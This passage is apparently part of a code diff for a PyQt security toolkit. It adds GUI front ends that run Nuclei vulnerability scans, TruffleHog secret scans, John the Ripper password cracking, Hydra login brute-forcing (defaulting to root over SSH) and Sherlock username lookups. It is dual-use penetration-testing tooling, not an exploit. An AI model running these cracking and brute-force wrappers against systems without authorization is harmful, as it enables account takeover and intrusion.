+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(controls['start_btn'])
+        buttons_layout.addWidget(controls['stop_btn'])
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.nuclei_output_console = QPlainTextEdit()
+        self.nuclei_output_console.setReadOnly(True)
+        self.nuclei_output_console.setFont(QFont("Courier New", 10))
+        self.nuclei_output_console.setPlaceholderText("Nuclei output will be displayed here...")
+        main_layout.addWidget(self.nuclei_output_console, 1)
+
+        controls['start_btn'].clicked.connect(self.start_nuclei_scan)
+        controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_nuclei_config_widget(self):
+        """Creates a reusable, self-contained widget with Nuclei's configuration options."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+        main_layout.setContentsMargins(0,0,0,0)
+
+        controls = {}
+
+        instructions = QTextEdit()
+        instructions.setReadOnly(True)
+        instructions.setHtml("""
+        <font color='#ffcc00'><b>Nuclei - Template-Based Vulnerability Scanner</b></font>
+        <p>This tool runs Nuclei, a fast and flexible vulnerability scanner. Configure the scan using the options below.</p>
+        """)
+        instructions.setFixedHeight(80)
+        main_layout.addWidget(instructions)
+
+        # --- Main Tab Widget for Options ---
+        nuclei_tabs = QTabWidget()
+        main_layout.addWidget(nuclei_tabs)
+
+        # --- Target Tab ---
+        target_tab = QWidget()
+        target_layout = QFormLayout(target_tab)
+
+        target_file_layout = QHBoxLayout()
+        controls['target_edit'] = QLineEdit()
+        controls['target_edit'].setPlaceholderText("e.g., https://example.com or path to target list file...")
+        controls['target_edit'].setToolTip("Enter a single target URL (-u) or path to a file with a list of targets (-l).")
+        target_file_layout.addWidget(controls['target_edit'])
+        browse_target_btn = QPushButton("Browse...")
+        browse_target_btn.clicked.connect(lambda: self._browse_file_for_lineedit(controls['target_edit'], "Select Target List File"))
+        target_file_layout.addWidget(browse_target_btn)
+        target_layout.addRow("Target URL/List (-u/-l):", target_file_layout)
+        nuclei_tabs.addTab(target_tab, "Target")
+
+        # --- Templates Tab ---
+        templates_tab = QWidget()
+        templates_layout = QFormLayout(templates_tab)
+
+        template_file_layout = QHBoxLayout()
+        controls['templates_edit'] = QLineEdit()
+        controls['templates_edit'].setPlaceholderText("e.g., cves/, http/exposures/, path/to/custom/templates/")
+        controls['templates_edit'].setToolTip("Comma-separated list of template directories or single template files to run (-t).")
+        template_file_layout.addWidget(controls['templates_edit'])
+        browse_template_btn = QPushButton("Browse...")
+        browse_template_btn.clicked.connect(lambda: self._browse_file_for_lineedit(controls['templates_edit'], "Select Template File or Directory"))
+        template_file_layout.addWidget(browse_template_btn)
+        templates_layout.addRow("Templates (-t):", template_file_layout)
+
+        controls['severity_combo'] = QComboBox()
+        controls['severity_combo'].addItems(["all", "info", "low", "medium", "high", "critical"])
+        controls['severity_combo'].setToolTip("Filter templates by severity (-s).")
+        templates_layout.addRow("Severity (-s):", controls['severity_combo'])
+
+        controls['tags_edit'] = QLineEdit()
+        controls['tags_edit'].setPlaceholderText("e.g., cve,rce,wordpress")
+        controls['tags_edit'].setToolTip("Filter templates by tags (-tags).")
+        templates_layout.addRow("Tags (-tags):", controls['tags_edit'])
+
+        nuclei_tabs.addTab(templates_tab, "Templates")
+
+        # --- Output & Config Tab ---
+        config_tab = QWidget()
+        config_layout = QFormLayout(config_tab)
+
+        output_file_layout = QHBoxLayout()
+        controls['output_edit'] = QLineEdit()
+        controls['output_edit'].setPlaceholderText("Optional: path to save report...")
+        output_file_layout.addWidget(controls['output_edit'])
+        browse_output_btn = QPushButton("Browse...")
+        browse_output_btn.clicked.connect(lambda: self._browse_save_file_for_lineedit(controls['output_edit'], "Save Nuclei Report"))
+        output_file_layout.addWidget(browse_output_btn)
+        config_layout.addRow("Output File (-o):", output_file_layout)
+
+        controls['concurrency_edit'] = QLineEdit("25")
+        controls['concurrency_edit'].setToolTip("Number of concurrent requests to send (-c).")
+        config_layout.addRow("Concurrency (-c):", controls['concurrency_edit'])
+
+        controls['ratelimit_edit'] = QLineEdit("150")
+        controls['ratelimit_edit'].setToolTip("Requests per second (-rl).")
+        config_layout.addRow("Rate Limit (-rl):", controls['ratelimit_edit'])
+
+        controls['verbose_check'] = QCheckBox("Verbose Output (-v)")
+        config_layout.addRow(controls['verbose_check'])
+
+        nuclei_tabs.addTab(config_tab, "Configuration")
+
+        # --- Action Buttons ---
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Nuclei Scan")
+        controls['stop_btn'] = QPushButton("Stop Nuclei"); controls['stop_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_nuclei_scan(self):
+        """Starts the Nuclei scan worker thread."""
+        controls = self.nuclei_controls
+        if not shutil.which("nuclei"):
+            QMessageBox.critical(self, "Nuclei Error", "'nuclei' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        target = controls['target_edit'].text().strip()
+        if not target:
+            QMessageBox.critical(self, "Input Error", "A target or target list is required.")
+            return
+
+        # Determine if target is a file or a URL
+        command = ["nuclei"]
+        if os.path.exists(target):
+            command.extend(["-l", target])
+        else:
+            command.extend(["-u", target])
+
+        if templates := controls['templates_edit'].text().strip():
+            command.extend(["-t", templates])
+
+        if (severity := controls['severity_combo'].currentText()) != "all":
+            command.extend(["-s", severity])
+
+        if tags := controls['tags_edit'].text().strip():
+            command.extend(["-tags", tags])
+
+        if output_file := controls['output_edit'].text().strip():
+            command.extend(["-o", output_file])
+
+        if concurrency := controls['concurrency_edit'].text().strip():
+            command.extend(["-c", concurrency])
+
+        if ratelimit := controls['ratelimit_edit'].text().strip():
+            command.extend(["-rl", ratelimit])
+
+        if controls['verbose_check'].isChecked():
+            command.append("-v")
+
+        command.extend(["-nC", "-json"]) # Always disable color and enable JSON for parsing
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.nuclei_output_console.clear()
+
+        self.worker = WorkerThread(_nuclei_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _nuclei_thread(self, command):
+        """Worker thread for running the nuclei command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting Nuclei with command: {' '.join(command)}")
+        q.put(('nuclei_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.nuclei_process = process
+
+            full_output = []
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('nuclei_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                # Don't send JSON to the console, just capture it
+                full_output.append(line)
+
+            process.stdout.close()
+            process.wait()
+
+            json_data = "".join(full_output)
+            q.put(('nuclei_output', json_data)) # Put the full JSON blob in the console
+            if not self.tool_stop_event.is_set() and json_data.strip():
+                q.put(('nuclei_results', json_data))
+
+
+        except FileNotFoundError:
+            q.put(('error', 'Nuclei Error', "'nuclei' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"Nuclei thread error: {e}", exc_info=True)
+            q.put(('error', 'Nuclei Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'nuclei_scan'))
+            with self.thread_finish_lock:
+                self.nuclei_process = None
+            logging.info("Nuclei scan thread finished.")
+
+    def _handle_nuclei_output(self, line):
+        self.nuclei_output_console.insertPlainText(line)
+        self.nuclei_output_console.verticalScrollBar().setValue(self.nuclei_output_console.verticalScrollBar().maximum())
+
+    def _create_trufflehog_tool(self):
+        """Creates the UI for the TruffleHog Secret Scanner tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        config_widget, self.trufflehog_controls = self._create_trufflehog_config_widget()
+        main_layout.addWidget(config_widget)
+
+        controls = self.trufflehog_controls
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(controls['start_btn'])
+        buttons_layout.addWidget(controls['stop_btn'])
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.trufflehog_output_console = QPlainTextEdit()
+        self.trufflehog_output_console.setReadOnly(True)
+        self.trufflehog_output_console.setFont(QFont("Courier New", 10))
+        self.trufflehog_output_console.setPlaceholderText("TruffleHog output will be displayed here...")
+        main_layout.addWidget(self.trufflehog_output_console, 1)
+
+        controls['start_btn'].clicked.connect(self.start_trufflehog_scan)
+        controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_trufflehog_config_widget(self):
+        """Creates a reusable, self-contained widget with TruffleHog's configuration options."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+        main_layout.setContentsMargins(0,0,0,0)
+
+        controls = {}
+
+        instructions = QTextEdit()
+        instructions.setReadOnly(True)
+        instructions.setHtml("""
+        <font color='#ffcc00'><b>TruffleHog - Secret Scanner</b></font>
+        <p>This tool scans sources like git repositories, GitHub, and filesystems for leaked secrets.</p>
+        """)
+        instructions.setFixedHeight(80)
+        main_layout.addWidget(instructions)
+
+        # --- Source Type and Target ---
+        source_box = QGroupBox("Scan Target")
+        source_layout = QVBoxLayout(source_box)
+
+        controls['source_type_group'] = QButtonGroup(self)
+        rb_layout = QHBoxLayout()
+        controls['git_rb'] = QRadioButton("Git Repo"); controls['git_rb'].setChecked(True)
+        controls['github_rb'] = QRadioButton("GitHub")
+        controls['filesystem_rb'] = QRadioButton("Filesystem")
+        controls['source_type_group'].addButton(controls['git_rb'])
+        controls['source_type_group'].addButton(controls['github_rb'])
+        controls['source_type_group'].addButton(controls['filesystem_rb'])
+        rb_layout.addWidget(controls['git_rb']); rb_layout.addWidget(controls['github_rb']); rb_layout.addWidget(controls['filesystem_rb'])
+        source_layout.addLayout(rb_layout)
+
+        target_layout = QHBoxLayout()
+        controls['target_edit'] = QLineEdit()
+        controls['target_edit'].setPlaceholderText("Enter Git URL, GitHub repo, or filesystem path...")
+        target_layout.addWidget(controls['target_edit'])
+        controls['browse_btn'] = QPushButton("Browse...")
+        controls['browse_btn'].clicked.connect(lambda: self._browse_dir_for_lineedit(controls['target_edit'], "Select Directory to Scan"))
+        target_layout.addWidget(controls['browse_btn'])
+        source_layout.addLayout(target_layout)
+
+        main_layout.addWidget(source_box)
+
+        # --- Options ---
+        options_box = QGroupBox("Options")
+        options_layout = QFormLayout(options_box)
+        controls['only_verified_check'] = QCheckBox("Only Verified Results")
+        controls['only_verified_check'].setToolTip("Only output secrets that have been successfully verified against their respective APIs.")
+        options_layout.addRow(controls['only_verified_check'])
+        main_layout.addWidget(options_box)
+
+        # --- Action Buttons ---
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Scan")
+        controls['stop_btn'] = QPushButton("Stop Scan"); controls['stop_btn'].setEnabled(False)
+
+        # UI Logic to show/hide browse button
+        def toggle_browse_button():
+            controls['browse_btn'].setVisible(controls['filesystem_rb'].isChecked())
+        controls['source_type_group'].buttonClicked.connect(toggle_browse_button)
+        toggle_browse_button() # Set initial state
+
+        return widget, controls
+
+    def _browse_dir_for_lineedit(self, line_edit_widget, dialog_title):
+        dir_path = QFileDialog.getExistingDirectory(self, dialog_title, options=QFileDialog.Option.DontUseNativeDialog)
+        if dir_path:
+            line_edit_widget.setText(dir_path)
+
+    def start_trufflehog_scan(self):
+        """Starts the TruffleHog scan worker thread."""
+        controls = self.trufflehog_controls
+        if not shutil.which("trufflehog"):
+            QMessageBox.critical(self, "TruffleHog Error", "'trufflehog' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        target = controls['target_edit'].text().strip()
+        if not target:
+            QMessageBox.critical(self, "Input Error", "A target is required.")
+            return
+
+        source_type = ""
+        if controls['git_rb'].isChecked(): source_type = "git"
+        elif controls['github_rb'].isChecked(): source_type = "github"
+        elif controls['filesystem_rb'].isChecked(): source_type = "filesystem"
+
+        command = ["trufflehog", source_type, target]
+
+        if controls['only_verified_check'].isChecked():
+            command.append("--only-verified")
+
+        # Always add --json for parsing, but hide the checkbox from the user to avoid confusion
+        command.append("--json")
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.trufflehog_output_console.clear()
+
+        self.worker = WorkerThread(_trufflehog_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _trufflehog_thread(self, command):
+        """Worker thread for running the trufflehog command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting TruffleHog with command: {' '.join(command)}")
+        q.put(('trufflehog_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.trufflehog_process = process
+
+            full_output = []
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('trufflehog_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                # Don't send JSON to the console, just capture it
+                full_output.append(line)
+
+            process.stdout.close()
+            process.wait()
+
+            json_data = "".join(full_output)
+            q.put(('trufflehog_output', json_data))
+            if not self.tool_stop_event.is_set() and json_data.strip():
+                q.put(('trufflehog_results', json_data))
+
+        except FileNotFoundError:
+            q.put(('error', 'TruffleHog Error', "'trufflehog' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"TruffleHog thread error: {e}", exc_info=True)
+            q.put(('error', 'TruffleHog Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'trufflehog_scan'))
+            with self.thread_finish_lock:
+                self.trufflehog_process = None
+            logging.info("TruffleHog scan thread finished.")
+
+    def _handle_trufflehog_output(self, line):
+        self.trufflehog_output_console.insertPlainText(line)
+        self.trufflehog_output_console.verticalScrollBar().setValue(self.trufflehog_output_console.verticalScrollBar().maximum())
+
+    def _create_jtr_tool(self):
+        """Creates the UI for the John the Ripper tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        config_widget, self.jtr_controls = self._create_jtr_config_widget()
+        main_layout.addWidget(config_widget)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(self.jtr_controls['start_btn'])
+        buttons_layout.addWidget(self.jtr_controls['show_btn'])
+        buttons_layout.addWidget(self.jtr_controls['stop_btn'])
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.jtr_output_console = QPlainTextEdit()
+        self.jtr_output_console.setReadOnly(True)
+        self.jtr_output_console.setFont(QFont("Courier New", 10))
+        self.jtr_output_console.setPlaceholderText("John the Ripper output will be displayed here...")
+        main_layout.addWidget(self.jtr_output_console, 1)
+
+        self.jtr_controls['start_btn'].clicked.connect(self.start_jtr_crack)
+        self.jtr_controls['show_btn'].clicked.connect(self.show_jtr_cracked)
+        self.jtr_controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_jtr_config_widget(self):
+        """Creates a reusable, self-contained widget with JTR's configuration options."""
+        widget = QWidget()
+        main_layout = QFormLayout(widget)
+        controls = {}
+
+        hash_file_layout = QHBoxLayout()
+        controls['hash_file_edit'] = QLineEdit()
+        controls['hash_file_edit'].setPlaceholderText("Path to hash file (required)...")
+        hash_file_layout.addWidget(controls['hash_file_edit'])
+        browse_hash_btn = QPushButton("Browse...")
+        browse_hash_btn.clicked.connect(lambda: self._browse_file_for_lineedit(controls['hash_file_edit'], "Select Hash File"))
+        hash_file_layout.addWidget(browse_hash_btn)
+        main_layout.addRow("Hash File:", hash_file_layout)
+
+        wordlist_layout = QHBoxLayout()
+        controls['wordlist_edit'] = QLineEdit()
+        controls['wordlist_edit'].setPlaceholderText("Path to wordlist file (optional)...")
+        wordlist_layout.addWidget(controls['wordlist_edit'])
+        browse_wordlist_btn = QPushButton("Browse...")
+        browse_wordlist_btn.clicked.connect(lambda: self._browse_file_for_lineedit(controls['wordlist_edit'], "Select Wordlist File"))
+        wordlist_layout.addWidget(browse_wordlist_btn)
+        main_layout.addRow("Wordlist:", wordlist_layout)
+
+        controls['format_edit'] = QLineEdit()
+        controls['format_edit'].setPlaceholderText("e.g., raw-md5, nt, sha512crypt")
+        controls['format_edit'].setToolTip("Specify the hash format (--format). Leave blank for auto-detection.")
+        main_layout.addRow("Format:", controls['format_edit'])
+
+        controls['rules_check'] = QCheckBox("Enable Word Mangling Rules")
+        controls['rules_check'].setToolTip("Enable rules for wordlist mode (--rules).")
+        main_layout.addRow(controls['rules_check'])
+
+        controls['incremental_check'] = QCheckBox("Incremental Mode (Brute-force)")
+        controls['incremental_check'].setToolTip("Enable incremental mode (--incremental). If wordlist is also specified, this will run after.")
+        main_layout.addRow(controls['incremental_check'])
+
+        controls['start_btn'] = QPushButton(QIcon("icons/tool.svg"), " Start Cracking")
+        controls['show_btn'] = QPushButton("Show Cracked")
+        controls['stop_btn'] = QPushButton("Stop"); controls['stop_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_jtr_crack(self):
+        """Starts the John the Ripper worker thread."""
+        self._start_jtr_generic(crack_mode=True)
+
+    def show_jtr_cracked(self):
+        """Shows already cracked passwords."""
+        self._start_jtr_generic(crack_mode=False)
+
+    def _start_jtr_generic(self, crack_mode):
+        controls = self.jtr_controls
+        if not shutil.which("john"):
+            QMessageBox.critical(self, "JTR Error", "'john' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        hash_file = controls['hash_file_edit'].text().strip()
+        if not hash_file:
+            QMessageBox.critical(self, "Input Error", "A hash file is required.")
+            return
+
+        command = ["john"]
+
+        if crack_mode:
+            wordlist = controls['wordlist_edit'].text().strip()
+            if wordlist:
+                command.extend([f"--wordlist={wordlist}"])
+                if controls['rules_check'].isChecked():
+                    command.append("--rules")
+            if controls['incremental_check'].isChecked():
+                command.append("--incremental")
+        else: # Show mode
+            command.append("--show")
+
+        if format_type := controls['format_edit'].text().strip():
+            command.extend([f"--format={format_type}"])
+
+        command.append(hash_file)
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['show_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.jtr_output_console.clear()
+
+        self.worker = WorkerThread(_jtr_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _jtr_thread(self, command):
+        """Worker thread for running the john command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting JTR with command: {' '.join(command)}")
+        q.put(('jtr_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.jtr_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('jtr_output', "\n\n--- Canceled By User ---\n"))
+                    break
+                q.put(('jtr_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+        except FileNotFoundError:
+            q.put(('error', 'JTR Error', "'john' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"JTR thread error: {e}", exc_info=True)
+            q.put(('error', 'JTR Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'jtr_scan'))
+            with self.thread_finish_lock:
+                self.jtr_process = None
+            logging.info("JTR scan thread finished.")
+
+    def _handle_jtr_output(self, line):
+        self.jtr_output_console.insertPlainText(line)
+        self.jtr_output_console.verticalScrollBar().setValue(self.jtr_output_console.verticalScrollBar().maximum())
+
+    def _create_hydra_tool(self):
+        """Creates the UI for the Hydra network logon cracker."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        config_widget, self.hydra_controls = self._create_hydra_config_widget()
+        main_layout.addWidget(config_widget)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(self.hydra_controls['start_btn'])
+        buttons_layout.addWidget(self.hydra_controls['stop_btn'])
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.hydra_output_console = QPlainTextEdit()
+        self.hydra_output_console.setReadOnly(True)
+        self.hydra_output_console.setFont(QFont("Courier New", 10))
+        self.hydra_output_console.setPlaceholderText("Hydra output will be displayed here...")
+        main_layout.addWidget(self.hydra_output_console, 1)
+
+        self.hydra_controls['start_btn'].clicked.connect(self.start_hydra_attack)
+        self.hydra_controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_hydra_config_widget(self):
+        """Creates a reusable, self-contained widget with Hydra's configuration options."""
+        widget = QWidget()
+        main_layout = QFormLayout(widget)
+        controls = {}
+
+        controls['target_edit'] = QLineEdit("localhost")
+        main_layout.addRow("Target Host:", controls['target_edit'])
+
+        controls['service_edit'] = QLineEdit("ssh")
+        controls['service_edit'].setToolTip("The service to attack (e.g., ssh, ftp, smb, rdp).")
+        main_layout.addRow("Service:", controls['service_edit'])
+
+        user_layout = QHBoxLayout()
+        controls['user_edit'] = QLineEdit("root")
+        controls['user_edit'].setToolTip("A single username to test (-l).")
+        user_layout.addWidget(controls['user_edit'])
+        user_layout.addWidget(QLabel("OR"))
+        controls['user_list_edit'] = QLineEdit()
+        controls['user_list_edit'].setToolTip("Path to a file containing a list of usernames (-L).")
+        user_layout.addWidget(controls['user_list_edit'])
+        browse_user_btn = QPushButton("Browse...")
+        browse_user_btn.clicked.connect(lambda: self._browse_file_for_lineedit(controls['user_list_edit'], "Select User List"))
+        user_layout.addWidget(browse_user_btn)
+        main_layout.addRow("Username (-l) / List (-L):", user_layout)
+
+        pass_layout = QHBoxLayout()
+        controls['pass_edit'] = QLineEdit()
+        controls['pass_edit'].setToolTip("A single password to test (-p).")
+        pass_layout.addWidget(controls['pass_edit'])
+        pass_layout.addWidget(QLabel("OR"))
+        controls['pass_list_edit'] = QLineEdit()
+        controls['pass_list_edit'].setToolTip("Path to a file containing a list of passwords (-P).")
+        pass_layout.addWidget(controls['pass_list_edit'])
+        browse_pass_btn = QPushButton("Browse...")
+        browse_pass_btn.clicked.connect(lambda: self._browse_file_for_lineedit(controls['pass_list_edit'], "Select Password List"))
+        pass_layout.addWidget(browse_pass_btn)
+        main_layout.addRow("Password (-p) / List (-P):", pass_layout)
+
+        controls['tasks_edit'] = QLineEdit("16")
+        controls['tasks_edit'].setToolTip("Number of parallel tasks/threads (-t).")
+        main_layout.addRow("Tasks (-t):", controls['tasks_edit'])
+
+        controls['start_btn'] = QPushButton(QIcon("icons/tool.svg"), " Start Attack")
+        controls['stop_btn'] = QPushButton("Stop"); controls['stop_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_hydra_attack(self):
+        """Starts the Hydra attack worker thread."""
+        controls = self.hydra_controls
+        if not shutil.which("hydra"):
+            QMessageBox.critical(self, "Hydra Error", "'hydra' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        target = controls['target_edit'].text().strip()
+        service = controls['service_edit'].text().strip()
+        if not target or not service:
+            QMessageBox.critical(self, "Input Error", "Target and Service are required.")
+            return
+
+        command = ["hydra"]
+
+        if user := controls['user_edit'].text().strip():
+            command.extend(["-l", user])
+        elif user_list := controls['user_list_edit'].text().strip():
+            command.extend(["-L", user_list])
+        else:
+            QMessageBox.critical(self, "Input Error", "A username or user list is required.")
+            return
+
+        if pwd := controls['pass_edit'].text().strip():
+            command.extend(["-p", pwd])
+        elif pass_list := controls['pass_list_edit'].text().strip():
+            command.extend(["-P", pass_list])
+        else:
+            QMessageBox.critical(self, "Input Error", "A password or password list is required.")
+            return
+
+        if tasks := controls['tasks_edit'].text().strip():
+            command.extend(["-t", tasks])
+
+        command.append(f"{service}://{target}")
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.hydra_output_console.clear()
+
+        self.worker = WorkerThread(_hydra_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _hydra_thread(self, command):
+        """Worker thread for running the hydra command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting Hydra with command: {' '.join(command)}")
+        q.put(('hydra_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.hydra_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('hydra_output', "\n\n--- Canceled By User ---\n"))
+                    break
+                q.put(('hydra_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+        except FileNotFoundError:
+            q.put(('error', 'Hydra Error', "'hydra' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"Hydra thread error: {e}", exc_info=True)
+            q.put(('error', 'Hydra Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'hydra_scan'))
+            with self.thread_finish_lock:
+                self.hydra_process = None
+            logging.info("Hydra scan thread finished.")
+
+    def _handle_hydra_output(self, line):
+        self.hydra_output_console.insertPlainText(line)
+        self.hydra_output_console.verticalScrollBar().setValue(self.hydra_output_console.verticalScrollBar().maximum())
+
+    def _create_sherlock_tool(self):
+        """Creates the UI for the Sherlock username scanner."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        config_widget, self.sherlock_controls = self._create_sherlock_config_widget()
+        main_layout.addWidget(config_widget)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(self.sherlock_controls['start_btn'])
+        buttons_layout.addWidget(self.sherlock_controls['stop_btn'])
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.sherlock_output_console = QPlainTextEdit()
+        self.sherlock_output_console.setReadOnly(True)
+        self.sherlock_output_console.setFont(QFont("Courier New", 10))
+        self.sherlock_output_console.setPlaceholderText("Sherlock output will be displayed here...")
+        main_layout.addWidget(self.sherlock_output_console, 1)
+
+        self.sherlock_controls['start_btn'].clicked.connect(self.start_sherlock_scan)
+        self.sherlock_controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_sherlock_config_widget(self):
+        """Creates a reusable, self-contained widget with Sherlock's configuration options."""
+        widget = QWidget()
+        main_layout = QFormLayout(widget)
+        controls = {}
+
+        controls['usernames_edit'] = QLineEdit()
+        controls['usernames_edit'].setToolTip("One or more usernames to check, separated by spaces.")
+        main_layout.addRow("Usernames:", controls['usernames_edit'])
+
+        controls['timeout_edit'] = QLineEdit("60")
+        controls['timeout_edit'].setToolTip("Timeout in seconds for each request.")
+        main_layout.addRow("Timeout (--timeout):", controls['timeout_edit'])
+
+        output_file_layout = QHBoxLayout()
+        controls['output_edit'] = QLineEdit()
+        controls['output_edit'].setPlaceholderText("Optional: path to save text report...")
+        output_file_layout.addWidget(controls['output_edit'])
+        browse_output_btn = QPushButton("Browse...")
+        browse_output_btn.clicked.connect(lambda: self._browse_save_file_for_lineedit(controls['output_edit'], "Save Sherlock Report"))
+        output_file_layout.addWidget(browse_output_btn)
+        main_layout.addRow("Output File (-o):", output_file_layout)
+
+        controls['csv_check'] = QCheckBox("Export as CSV")
+        main_layout.addRow("--csv:", controls['csv_check'])
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Hunt Usernames")
+        controls['stop_btn'] = QPushButton("Stop"); controls['stop_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_sherlock_scan(self):
+        """Starts the Sherlock scan worker thread."""
+        controls = self.sherlock_controls
+        if not shutil.which("sherlock"):
+            QMessageBox.critical(self, "Sherlock Error", "'sherlock' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        usernames = controls['usernames_edit'].text().strip()
+        if not usernames:
+            QMessageBox.critical(self, "Input Error", "At least one username is required.")
+            return
+
+        command = ["sherlock", "--no-color"]
+
+        if timeout := controls['timeout_edit'].text().strip():
+            command.extend(["--timeout", timeout])
+
+        try:
+            # Create a temporary directory for sherlock to save its files
+            self.sherlock_temp_dir = tempfile.mkdtemp()
+            # Sherlock saves as <username>.csv in the specified folder
+            # We don't know the exact filename beforehand if multiple users are scanned
+            command.extend(["-fo", self.sherlock_temp_dir, "--csv"])
+        except Exception as e:
